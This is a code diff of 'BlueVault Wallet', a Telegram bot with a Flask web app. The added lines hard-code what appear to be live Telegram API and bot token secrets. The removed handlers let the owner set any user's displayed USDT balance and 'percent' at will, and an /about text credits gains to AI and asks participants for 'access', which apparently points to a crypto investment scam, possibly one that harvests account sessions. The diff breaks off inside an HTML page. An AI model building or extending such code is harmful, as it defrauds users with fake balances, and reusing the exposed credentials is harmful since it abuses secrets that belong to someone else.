@@ -10,11 +10,11 @@ from telethon.sessions import StringSession
 from flask import Flask, request, jsonify
 
 # ====================== НАСТРОЙКИ ======================
-API_ID = int(os.getenv('API_ID', 8))
-API_HASH = os.getenv('API_HASH')
-BOT_TOKEN = os.getenv('BOT_TOKEN')
-OWNER_ID = int(os.getenv('OWNER_ID', 1663746192))
-CRYPTO_ADDRESS = os.getenv('CRYPTO_ADDRESS', '0xYourAddressHere')
+API_ID = 8
+API_HASH = '7245de8e747a0d6fbe11f7cc14fcc0bb'
+BOT_TOKEN = '8867073594:AAFf79ATdyNaAJQHtLWedIymQtRof01z1C8'
+OWNER_ID = 1663746192
+CRYPTO_ADDRESS = '0xYourAddress'
 DEFAULT_PERCENT = 0
 
 DATA_FILE = 'bluevault_data.json'
@@ -66,7 +66,7 @@ def already_handled(event):
 # ====================== FLASK ======================
 @app.route('/')
 def index():
-    return HTML_PAGE  # ваш HTML остаётся без изменений
+    return HTML_PAGE
 
 @app.route('/get_balance')
 def get_balance():
@@ -80,69 +80,15 @@ def get_balance():
 def get_address():
     return jsonify({'address': CRYPTO_ADDRESS})
 
-# ====================== ОБРАБОТЧИКИ БОТА ======================
-@bot.on(events.NewMessage(pattern='/start'))
-async def start(event):
-    if already_handled(event): return
-    user_id = str(event.sender_id)
-    user_balances.setdefault(user_id, 0)
-    save_data(user_balances, current_percent)
-
-    await event.respond(
-        '🛡 **BlueVault Wallet**\n\n'
-        'Используйте /about для информации о проекте.',
-        buttons=[[Button.url('🚀 Открыть приложение', 'https://t.me/BlueVaultt_bot/bluevallet')]]
-    )
-
-@bot.on(events.NewMessage(pattern='/about'))
-async def about(event):
-    if already_handled(event): return
-    await event.respond(
-        'ℹ **О проекте BlueVault**\n\n'
-        '1. Участник предоставляет интерфейс доступа.\n'
-        '2. Система анализирует рынок и проводит операции.\n'
-        '3. Положительные изменения — технический эффект работы ИИ.\n\n'
-        '**Внимание:** Проект экспериментальный. Действуйте на свой страх и риск.'
-    )
-
-@bot.on(events.NewMessage(pattern='/setbalance'))
-async def set_balance(event):
-    if already_handled(event) or event.sender_id != OWNER_ID: return
-    try:
-        _, target_id, amount = event.text.split()
-        user_balances[str(target_id)] = float(amount)
-        save_data(user_balances, current_percent)
-        await event.respond(f'✅ Баланс обновлён:\n{target_id} → {amount} USDT')
-    except:
-        await event.respond('Использование: `/setbalance <user_id> <сумма>`')
-
-@bot.on(events.NewMessage(pattern='/setpercent'))
-async def set_percent(event):
-    if already_handled(event) or event.sender_id != OWNER_ID: return
-    try:
-        global current_percent
-        current_percent = int(event.text.split()[1])
-        save_data(user_balances, current_percent)
-        await event.respond(f'✅ Процент установлен: {current_percent}%')
-    except:
-        await event.respond('Использование: `/setpercent <число>`')
-
-@bot.on(events.NewMessage(pattern='/myid'))
-async def myid(event):
-    if already_handled(event): return
-    await event.respond(f'Ваш ID: `{event.sender_id}`')
-
-# ... остальные обработчики (/verify, /reply, /endverify, /msg) можете оставить как были
-
-async def main():
-    await bot.start(bot_token=BOT_TOKEN)
-    logger.info("Бот успешно запущен")
-    await bot.run_until_disconnected()
-
-def run_flask():
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
-
-if __name__ == '__main__':
-    Thread(target=run_flask, daemon=True).start()
-    loop.run_until_complete(main())
+# ====================== HTML СТРАНИЦА (оригинальная) ======================
+HTML_PAGE = '''
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>BlueVault</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root { --bg: #0a1628; --card: #0f1f3d; --border: #1a3256; --blue: #2196F3; --blue-light: #64B5F6; --text: #E3F2FD; --text-secondary: #90CAF9; --green: #4CAF50; --red: #EF5350; }
+        * { margin: 0
